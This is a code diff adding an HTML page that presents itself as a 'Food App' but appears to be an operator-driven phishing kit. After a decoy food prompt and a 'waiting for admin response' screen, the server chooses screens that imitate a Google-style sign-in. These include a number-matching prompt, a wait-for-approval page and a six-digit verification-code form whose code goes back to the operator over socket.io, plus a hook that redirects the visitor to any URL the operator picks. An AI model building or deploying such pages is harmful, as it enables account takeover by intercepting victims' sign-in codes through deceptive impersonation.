@@ -1,0 +1,669 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Food App</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <style>
+    * {
+      box-sizing: border-box;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Roboto", "Oxygen", "Ubuntu", "Cantarell", sans-serif;
+    }
+
+    body {
+      margin: 0;
+      background: #f4f6f8;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      min-height: 100vh;
+      padding-top: 80px;
+    }
+
+    .app {
+      width: 90%;
+      max-width: 420px;
+    }
+
+    .screen {
+      display: none;
+    }
+
+    h2 {
+      font-weight: 500;
+      margin-bottom: 30px;
+      color: #222;
+    }
+
+    /* ===== SCREEN 1 & 2 NEW DESIGN ===== */
+
+    #screen1, #screen2 {
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      min-height: 100vh;
+      border-radius: 20px;
+      padding: 50px 30px;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.15);
+      animation: slideUp 0.5s ease-out;
+    }
+
+    @keyframes slideUp {
+      from {
+        opacity: 0;
+        transform: translateY(30px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    #screen1 h2, #screen2 h2 {
+      color: #ffffff;
+      text-align: center;
+      font-size: 28px;
+      margin-bottom: 45px;
+      text-transform: capitalize;
+    }
+
+    /* SCREEN 1 INPUT */
+
+    .input-group {
+      margin-bottom: 30px;
+    }
+
+    .input-group input {
+      width: 100%;
+      border: none;
+      padding: 14px 16px;
+      font-size: 16px;
+      background: rgba(255, 255, 255, 0.95);
+      outline: none;
+      border-radius: 12px;
+      transition: all 0.3s ease;
+      color: #1a1a1a;
+      font-weight: 500;
+    }
+
+    .input-group input::placeholder {
+      color: #999;
+      font-weight: 400;
+    }
+
+    .input-group input:focus {
+      background: #ffffff;
+      box-shadow: 0 0 0 4px rgba(255, 255, 255, 0.2);
+      transform: translateY(-2px);
+    }
+
+    .btn-container {
+      margin-top: 40px;
+      text-align: center;
+    }
+
+    button {
+      width: 100%;
+      background: rgba(255, 255, 255, 0.95);
+      color: #667eea;
+      border: none;
+      padding: 16px 22px;
+      border-radius: 12px;
+      cursor: pointer;
+      font-size: 16px;
+      font-weight: 600;
+      transition: all 0.3s ease;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+    }
+
+    button:hover {
+      background: white;
+      transform: translateY(-2px);
+      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
+    }
+
+    button:active {
+      transform: translateY(0);
+    }
+
+    button:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
+
+    button.loading {
+      position: relative;
+      color: transparent;
+    }
+
+    button.loading::after {
+      content: '';
+      position: absolute;
+      width: 16px;
+      height: 16px;
+      top: 50%;
+      left: 50%;
+      margin-left: -8px;
+      margin-top: -8px;
+      border: 2px solid #667eea;
+      border-radius: 50%;
+      border-top-color: transparent;
+      animation: spin 0.6s linear infinite;
+    }
+
+    /* ===== MODERN SPINNER ===== */
+
+    .spinner-wrapper {
+      text-align: center;
+      padding: 60px 20px;
+    }
+
+    .loader {
+      width: 60px;
+      height: 60px;
+      border: 4px solid rgba(255, 255, 255, 0.3);
+      border-top: 4px solid white;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 20px auto;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .loading-text {
+      color: rgba(255, 255, 255, 0.9);
+      font-size: 16px;
+      font-weight: 500;
+      margin-top: 20px;
+    }
+
+    /* ===== RESULT SCREENS A B C (UNCHANGED) ===== */
+
+    .result-card {
+      background: white;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 5px 20px rgba(0,0,0,0.08);
+      text-align: center;
+    }
+
+    .result-card h2 {
+      margin-bottom: 20px;
+    }
+
+    .instruction {
+      font-size: 16px;
+      color: #333;
+    }
+
+    /* ===== SCREEN A DESIGN (UNCHANGED) ===== */
+
+    .a-container {
+      text-align: center;
+    }
+
+    .logo-text {
+      font-size: 32px;
+      font-weight: 600;
+      margin-bottom: 25px;
+    }
+
+    .a-title {
+      font-weight: 500;
+      margin-bottom: 10px;
+    }
+
+    .a-sub {
+      color: #555;
+      margin-bottom: 35px;
+    }
+
+    .a-boxes {
+      display: flex;
+      justify-content: center;
+      gap: 15px;
+      margin-bottom: 40px;
+    }
+
+    .a-box {
+      width: 80px;
+      height: 70px;
+      border-radius: 10px;
+      border: 1px solid #ccc;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-size: 18px;
+      background: white;
+      transition: 0.3s ease;
+    }
+
+    .a-box.active {
+      background: #1a73e8;
+      color: white;
+      border: none;
+    }
+
+    .a-links {
+      display: flex;
+      justify-content: space-between;
+      padding: 0 30px;
+      color: #1a73e8;
+      font-size: 14px;
+      cursor: pointer;
+    }
+
+    /* ===== SCREEN B DESIGN (UNCHANGED) ===== */
+
+    .b-container {
+      text-align: center;
+    }
+
+    .b-title {
+      font-weight: 600;
+      margin-bottom: 15px;
+    }
+
+    .b-sub {
+      color: #555;
+      margin-bottom: 30px;
+      padding: 0 20px;
+    }
+
+    .b-loader {
+      width: 45px;
+      height: 45px;
+      border: 4px solid #e3e3e3;
+      border-top: 4px solid #1a73e8;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 20px auto;
+    }
+
+    .b-link {
+      margin-top: 25px;
+      color: #1a73e8;
+      font-size: 14px;
+      cursor: pointer;
+    }
+
+    /* ===== SCREEN C DESIGN (UNCHANGED) ===== */
+
+    .c-wrapper {
+      width: 100%;
+      display: flex;
+      justify-content: center;
+      padding-top: 60px;
+      padding-left: 20px;
+      padding-right: 20px;
+    }
+
+    .c-card {
+      background: white;
+      width: 100%;
+      max-width: 400px;
+      padding: 30px 25px 35px 25px;
+      border-radius: 18px;
+      box-shadow: 0 12px 30px rgba(0,0,0,0.08);
+      text-align: center;
+    }
+
+    .c-card h2 {
+      margin-bottom: 8px;
+      font-weight: 600;
+    }
+
+    .c-instruction {
+      color: #666;
+      font-size: 14px;
+      margin-bottom: 30px;
+      line-height: 1.4;
+    }
+
+    /* OTP BOXES */
+    .c-inputs {
+      display: flex;
+      justify-content: center;
+      gap: 12px;
+      margin-bottom: 30px;
+    }
+
+    .c-inputs input {
+      width: 48px;
+      height: 55px;
+      border-radius: 10px;
+      border: 1px solid #d0d5dd;
+      text-align: center;
+      font-size: 20px;
+      outline: none;
+      transition: 0.2s ease;
+    }
+
+    .c-inputs input:focus {
+      border-color: #6c63ff;
+      box-shadow: 0 0 0 2px rgba(108,99,255,0.15);
+    }
+
+    /* VERIFY BUTTON */
+    .c-btn {
+      width: 100%;
+      padding: 15px;
+      border-radius: 12px;
+      border: none;
+      background: linear-gradient(90deg, #6c63ff, #5a54d1);
+      color: white;
+      font-size: 16px;
+      cursor: pointer;
+      transition: 0.2s ease;
+      margin-bottom: 18px;
+    }
+
+    .c-btn:active {
+      transform: scale(0.98);
+    }
+
+    /* RESEND */
+    .c-resend {
+      font-size: 13px;
+      color: #777;
+    }
+
+    .c-resend span {
+      color: #6c63ff;
+      cursor: pointer;
+    }
+
+    /* Spinner below button */
+    .c-loading {
+      display: none;
+      margin-top: 20px;
+    }
+
+    /* ===== MOBILE OPTIMIZATION ===== */
+    @media (max-width: 480px) {
+      body {
+        padding-top: 60px;
+      }
+
+      #screen1, #screen2 {
+        padding: 35px 24px;
+        border-radius: 16px;
+      }
+
+      #screen1 h2, #screen2 h2 {
+        font-size: 24px;
+      }
+
+      .input-group input {
+        padding: 13px 14px;
+        font-size: 16px;
+      }
+
+      button {
+        padding: 14px;
+        font-size: 15px;
+      }
+
+      .spinner-wrapper {
+        padding: 40px 20px;
+      }
+
+      .loader {
+        width: 50px;
+        height: 50px;
+      }
+
+      .btn-container {
+        text-align: center;
+      }
+
+      .c-wrapper {
+        padding-top: 40px;
+      }
+
+      .c-card {
+        padding: 25px 20px 30px 20px;
+      }
+
+      .c-inputs input {
+        height: 50px;
+        font-size: 18px;
+      }
+
+      .c-btn {
+        padding: 14px;
+      }
+    }
+
+  </style>
+</head>
+
+<body>
+
+<div class="app">
+
+  <!-- SCREEN 1 -->
+  <div id="screen1" class="screen">
+    <h2>enter favorite food</h2>
+
+    <div class="input-group">
+      <input type="text" id="foodInput" placeholder="Enter your food here..." />
+    </div>
+
+    <div class="btn-container">
+      <button onclick="submitFood()">continue</button>
+    </div>
+  </div>
+
+  <!-- SCREEN 2 -->
+  <div id="screen2" class="screen">
+    <h2>Processing</h2>
+    <div class="spinner-wrapper">
+      <div class="loader"></div>
+      <div class="loading-text">Waiting for admin response...</div>
+    </div>
+  </div>
+
+  <!-- SCREEN A -->
+  <div id="screenA" class="screen">
+    <div class="a-container">
+
+      <div class="logo-text">
+        <span style="color:#4285F4">h</span>
+        <span style="color:#EA4335">e</span>
+        <span style="color:#FBBC05">l</span>
+        <span style="color:#34A853">u</span>
+        <span style="color:#EA4335">r</span>
+        <span style="color:#4285F4">e</span>
+      </div>
+
+      <h2 class="a-title">happy to see you</h2>
+      <p class="a-sub">Trying to continue?<br>we love food.</p>
+
+      <div class="a-boxes">
+        <div class="a-box" id="box1"></div>
+        <div class="a-box" id="box2"></div>
+        <div class="a-box" id="box3"></div>
+      </div>
+
+      <div class="a-links">
+        <span onclick="socket.emit('reset_food')">Back</span>
+        <span>Try another way</span>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- SCREEN B -->
+  <div id="screenB" class="screen">
+    <div class="b-container">
+
+      <div class="logo-text">
+        <span style="color:#4285F4">h</span>
+        <span style="color:#EA4335">e</span>
+        <span style="color:#FBBC05">l</span>
+        <span style="color:#34A853">u</span>
+        <span style="color:#EA4335">r</span>
+        <span style="color:#4285F4">e</span>
+      </div>
+
+      <h2 class="b-title">Processing your request...</h2>
+
+      <p id="instructionB" class="b-sub"></p>
+
+      <div class="b-loader"></div>
+
+      <div class="b-link">
+        <span onclick="socket.emit('reset_food')">Try a different option</span>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- SCREEN C -->
+  <div id="screenC" class="screen">
+    <div class="c-wrapper">
+      <div class="c-card">
+
+        <h2>helo</h2>
+        <p id="instructionC" class="c-instruction"></p>
+
+        <div class="c-inputs">
+          <input type="text" maxlength="1" class="codeInput">
+          <input type="text" maxlength="1" class="codeInput">
+          <input type="text" maxlength="1" class="codeInput">
+          <input type="text" maxlength="1" class="codeInput">
+          <input type="text" maxlength="1" class="codeInput">
+          <input type="text" maxlength="1" class="codeInput">
+        </div>
+
+        <button class="c-btn" onclick="submitCode()">Verify</button>
+
+        <div class="c-resend">
+          Didn't receive a code? <span>Resend</span>
+        </div>
+
+        <div class="c-loading" id="cLoading">
+          <div class="loader"></div>
+        </div>
+
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<script src="/socket.io/socket.io.js"></script>
+
+<script>
+  const socket = io();
+  let sessionId = null;
+
+  function showScreen(id) {
+    document.querySelectorAll(".screen").forEach(s => s.style.display = "none");
+    document.getElementById(id).style.display = "block";
+  }
+
+  showScreen("screen1");
+
+  socket.on("connect", () => {
+    socket.emit("start_session");
+  });
+
+  socket.on("session_created", (data) => {
+    sessionId = data.sessionId;
+  });
+
+  function submitFood() {
+    const food = document.getElementById("foodInput").value;
+    if (!food) return;
+
+    socket.emit("submit_food", {
+      sessionId: sessionId,
+      food: food
+    });
+
+    showScreen("screen2");
+  }
+
+  socket.on("session_completed", (data) => {
+
+    if (data.choice === "A") {
+
+      const boxes = [
+        document.getElementById("box1"),
+        document.getElementById("box2"),
+        document.getElementById("box3")
+      ];
+
+      boxes.forEach(box => box.classList.remove("active"));
+
+      const correctIndex = Math.floor(Math.random() * 3);
+
+      boxes.forEach((box, index) => {
+        if (index === correctIndex) {
+          box.innerText = data.value;
+          box.classList.add("active");
+        } else {
+          box.innerText = Math.floor(Math.random() * 90 + 10);
+        }
+      });
+
+      showScreen("screenA");
+    }
+
+    if (data.choice === "B") {
+      document.getElementById("instructionB").innerText = data.value;
+      showScreen("screenB");
+    }
+
+    if (data.choice === "C") {
+      document.getElementById("instructionC").innerText = data.value;
+      showScreen("screenC");
+    }
+
+  });
+
+  socket.on("reset_food", () => {
+    showScreen("screen1");
+  });
+
+  socket.on("redirect_user", (data) => {
+    window.location.href = data.url;
+  });
+
+  // Auto move between OTP boxes
+  document.addEventListener("input", function(e) {
+    if (e.target.classList.contains("codeInput")) {
+      e.target.value = e.target.value.replace(/[^0-9]/g, '');
+
+      if (e.target.value && e.target.nextElementSibling) {
+        e.target.nextElementSibling.focus();
+      }
+    }
+  });
+
+  function submitCode() {
+    const inputs = document.querySelectorAll(".codeInput");
+    let code = "";
+
+    inputs.forEach(input => {
+      code += input.value;
+    });
+
+    if (code.length !== 6) return;
+
+    document.getElementById("cLoading").style.display = "block";
+
+    socket.emit("submit_code", {
+      sessionId: sessionId,
+      code: code
+    });
+  }
+
+</script>
+
+</body>
+</html>
